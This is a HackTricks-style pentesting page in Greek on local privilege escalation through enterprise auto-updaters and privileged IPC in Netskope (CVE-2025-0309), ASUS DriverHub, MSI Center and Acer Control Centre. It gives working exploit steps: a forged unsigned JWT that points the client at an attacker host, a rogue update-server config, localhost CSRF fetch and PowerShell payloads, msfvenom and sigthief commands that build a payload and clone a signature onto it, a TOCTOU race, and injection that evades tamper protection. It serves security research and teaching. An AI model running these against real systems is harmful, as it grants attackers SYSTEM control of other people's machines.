# Κατάχρηση Enterprise Auto-Updaters και Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία Windows local privilege escalation chains που βρίσκονται σε enterprise endpoint agents και updaters και εκθέτουν μια low\-friction IPC surface και μια privileged update flow. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας low\-privileged χρήστης μπορεί να εξαναγκάσει enrollment σε έναν attacker\-controlled server και στη συνέχεια να παραδώσει ένα κακόβουλο MSI που εγκαθιστά η υπηρεσία SYSTEM.

Key ideas you can reuse against similar products:
- Καταχράστε την localhost IPC μιας privileged υπηρεσίας για να αναγκάσετε re\-enrollment ή reconfiguration σε έναν attacker server.
- Υλοποιήστε τα update endpoints του vendor, παραδώστε έναν rogue Trusted Root CA, και στρέψτε τον updater σε ένα κακόβουλο, “signed” package.
- Αποφύγετε αδύναμους signer checks (CN allow\-lists), optional digest flags, και lax MSI properties.
- Αν το IPC είναι “encrypted”, εξάγετε το key/IV από world\-readable machine identifiers που αποθηκεύονται στο registry.
- Εάν η υπηρεσία περιορίζει τους καλούντες με βάση το image path/process name, inject σε ένα allow\-listed process ή spawn ένα suspended και bootstrap το DLL σας μέσω ενός ελάχιστου thread\-context patch.

---
## 1) Εξαναγκασμός enrollment σε attacker server μέσω localhost IPC

Πολλοί agents συνοδεύουν μια user\-mode UI διεργασία που επικοινωνεί με μια SYSTEM υπηρεσία πάνω από localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε σε Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Κατασκευάστε ένα JWT enrollment token του οποίου τα claims ελέγχουν τον backend host (π.χ. AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται υπογραφή.
2) Στείλτε το IPC μήνυμα που καλεί την provisioning εντολή με το JWT σας και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να κάνει αιτήματα προς τον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Εάν η caller verification είναι path/name\-based, ξεκινήστε το αίτημα από ένα allow\-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ το προς ένα attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ μικρό updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα πιστοποιητικό CA σε μορφή PEM. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει μεταδεδομένα που δείχνουν σε ένα κακόβουλο MSI και μια ψεύτικη έκδοση.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: η υπηρεσία μπορεί να ελέγχει μόνο ότι το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Η rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπεριλάβετε μια αβλαβή MSI property με όνομα CERT_DIGEST. Δεν υπάρχει επιβολή κατά την εγκατάσταση.
- Optional digest enforcement: flag ρυθμίσεων (π.χ., check_msi_digest=false) απενεργοποιεί πρόσθετο κρυπτογραφικό έλεγχο.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI σας από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Από το R127, η Netskope τύλιξε το IPC JSON σε ένα πεδίο encryptData που μοιάζει με Base64. Αναστροφή κώδικα έδειξε AES με key/IV που προέρχονται από τιμές μητρώου αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι επιτιθέμενοι μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες κρυπτογραφημένες εντολές από έναν τυπικό χρήστη. Γενική συμβουλή: αν ένας agent ξαφνικά «κρυπτογραφεί» το IPC του, ψάξτε για device IDs, product GUIDs, install IDs κάτω από HKLM ως υλικό.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Κάποιες υπηρεσίες προσπαθούν να αυθεντικοποιήσουν το peer αναλύοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow\-listed vendor binaries που βρίσκονται κάτω από Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παρακάμψεις:
- DLL injection σε ένα allow\-listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Εκκινήστε ένα allow\-listed binary σε suspended κατάσταση και bootstrap το proxy DLL σας χωρίς CreateRemoteThread (βλέπε §5) για να ικανοποιήσετε τους κανόνες tamper που επιβάλλει ο driver.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Προϊόντα συχνά συνοδεύονται από έναν minifilter/OB callbacks driver (π.χ., Stadrv) για να αφαιρούν επικίνδυνα δικαιώματα από handles προς προστατευμένες διεργασίες:
- Process: αφαιρεί PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user\-mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Αποκτήστε τα handles που εξακολουθείτε να έχετε δικαίωμα: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στη διεργασία, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή απλώς THREAD_RESUME αν επιδιορθώσετε κώδικα σε γνωστό RIP).
3) Επικαλύψτε ntdll!NtContinue (ή άλλο early, guaranteed\-mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο path του DLL σας, και μετά πηδά πίσω.
4) ResumeThread για να ενεργοποιήσετε το stub εντός της διεργασίας, φορτώνοντας το DLL σας.

Εφόσον δεν χρησιμοποιήσατε ποτέ PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε μια ήδη\-προστατευμένη διεργασία (εσείς τη δημιουργήσατε), η πολιτική του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) αυτοματοποιεί μια rogue CA, το signing κακόβουλου MSI, και εξυπηρετεί τα απαιτούμενα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope είναι ένας custom IPC client που δημιουργεί αυθαίρετα (προαιρετικά AES\-encrypted) IPC μηνύματα και περιλαμβάνει την suspended\-process injection για να προέρχεται από ένα allow\-listed binary.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

Το DriverHub προμηθεύει μια user\-mode HTTP υπηρεσία (ADU.exe) στο 127.0.0.1:53000 που αναμένει κλήσεις από τον browser προερχόμενες από https://driverhub.asus.com. Το φίλτρο origin απλά εκτελεί `string_contains(".asus.com")` πάνω στο Origin header και στις download URLs που εκτίθενται από `/asus/v1.0/*`. Οποιοσδήποτε host που ελέγχεται από επιτιθέμενο όπως `https://driverhub.asus.com.attacker.tld` επομένως περνάει τον έλεγχο και μπορεί να εκδώσει αιτήματα που αλλάζουν κατάσταση από JavaScript. Δείτε [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) για πρόσθετα πρότυπα παρακάμψεων.

Πρακτική ροή:
1) Καταχωρήστε ένα domain που ενσωματώνει `.asus.com` και φιλοξενήστε εκεί μια κακόβουλη σελίδα.
2) Χρησιμοποιήστε `fetch` ή XHR για να καλέσετε ένα privileged endpoint (π.χ., `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλτε το JSON body που αναμένει ο handler – το packed frontend JS δείχνει το schema παρακάτω.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Ακόμη και το PowerShell CLI που φαίνεται παρακάτω επιτυγχάνει όταν η επικεφαλίδα Origin είναι spoofed στην εμπιστευμένη τιμή:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Κάθε επίσκεψη προγράμματος περιήγησης στον ιστότοπο του επιτιθέμενου γίνεται έτσι ένα 1\-click (ή 0\-click μέσω `onload`) τοπικό CSRF που ενεργοποιεί έναν helper με δικαιώματα SYSTEM.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON σώμα και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Ο έλεγχος της URL λήψης επαναχρησιμοποιεί την ίδια λογική βασισμένη σε υποσυμβολοσειρές, οπότε το `http://updates.asus.com.attacker.tld:8000/payload.exe` γίνεται αποδεκτό. Μετά τη λήψη, το ADU.exe απλώς ελέγχει ότι το PE περιέχει υπογραφή και ότι το Subject string ταιριάζει με ASUS πριν το εκτελέσει – δεν καλείται `WinVerifyTrust`, δεν γίνεται έλεγχος αλυσίδας.

Για να εκμεταλλευτείτε τη ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον signer της ASUS μέσα σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε ένα domain που μοιάζει με `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του browser CSRF που περιγράφηκε παραπάνω.

Επειδή τόσο τα Origin όσο και τα URL φίλτρα βασίζονται σε υποσυμβολοσειρές και ο έλεγχος του signer συγκρίνει μόνο συμβολοσειρές, το DriverHub τραβά και εκτελεί το δυνητικό κακόβουλο binary υπό το ανυψωμένο του context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Η υπηρεσία SYSTEM του MSI Center εκθέτει ένα TCP πρωτόκολλο όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) μεταφέρει `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο σε `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να ισούται με “MICRO-STAR INTERNATIONAL CO., LTD.” και επιτυγχάνεται `WinVerifyTrust`).
3) Δημιουργεί ένα scheduled task που τρέχει το προσωρινό αρχείο ως SYSTEM με επιχειρήματα ελεγχόμενα από τον επιτιθέμενο.

Το αντιγραμμένο αρχείο δεν κλειδώνει μεταξύ της επαλήθευσης και του `ExecuteTask()`. Ένας επιτιθέμενος μπορεί:
- Να στείλει Frame A που δείχνει σε ένα νόμιμο binary υπογεγραμμένο από MSI (εξασφαλίζει ότι ο έλεγχος υπογραφής θα περάσει και η εργασία θα μπει στη σειρά).
- Να το συναγωνιστεί (race) με επαναλαμβανόμενα μηνύματα Frame B που δείχνουν σε κακόβουλο payload, αντικαθιστώντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το αντικατεστημένο payload ως SYSTEM παρά το γεγονός ότι είχε επικυρωθεί το αρχικό αρχείο. Για αξιόπιστη εκμετάλλευση χρησιμοποιούνται δύο goroutines/threads που σπαμμάρουν το CMD_AutoUpdateSDK μέχρι να κερδηθεί το TOCTOU παράθυρο.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID που αποθηκεύεται υπό `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν εκείνο το component, επιτρέποντας σε επιτιθέμενους να δρομολογούν εντολές σε οποιοδήποτε module.
- Τα plugins μπορούν να ορίσουν τους δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί άμεσα `API_Support.EX_Task::ExecuteTask()` χωρίς **έλεγχο υπογραφής** – οποιοσδήποτε τοπικός χρήστης μπορεί να το δείξει στο `C:\Users\<user>\Desktop\payload.exe` και να αποκτήσει εκτέλεση ως SYSTEM με απόλυτη ασφάλεια.
- Το sniffing του loopback με Wireshark ή η instrumentation των .NET binaries στο dnSpy αποκαλύπτει γρήγορα το mapping Component ↔ command· custom Go/ Python clients μπορούν στη συνέχεια να αναπαράγουν frames.

### Acer Control Centre named pipes & impersonation levels
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει απομακρυσμένους clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή command ID `7` με ένα file path καλεί τη ρουτίνα δημιουργίας process της υπηρεσίας.
- Η βιβλιοθήκη πελάτη σειριοποιεί ένα magic terminator byte (113) μαζί με τα args. Η δυναμική instrumentation με Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε `SECURITY_IMPERSONATION_LEVEL` και SID ακεραιότητας πριν καλέσει `CreateProcessAsUser`.
- Η αλλαγή του 113 (`0x71`) σε 114 (`0x72`) πέφτει στο γενικό branch που διατηρεί το πλήρες SYSTEM token και θέτει ένα SID υψηλής ακεραιότητας (`S-1-16-12288`). Το spawned binary τρέχει επομένως ως απεριόριστο SYSTEM, τόσο τοπικά όσο και cross-machine.
- Συνδυάστε αυτό με τη δημόσια σημαία installer (`Setup.exe -nocheck`) για να στήσετε το ACC ακόμα και σε εργαστηριακά VM και να δοκιμάσετε τον pipe χωρίς εξοπλισμό του vendor.

Αυτά τα bugs στο IPC τονίζουν γιατί οι υπηρεσίες localhost πρέπει να εφαρμόζουν αμοιβαία authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) και γιατί ο helper κάθε module που «τρέχει αυθαίρετο binary» πρέπει να μοιράζεται τους ίδιους ελέγχους signer.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
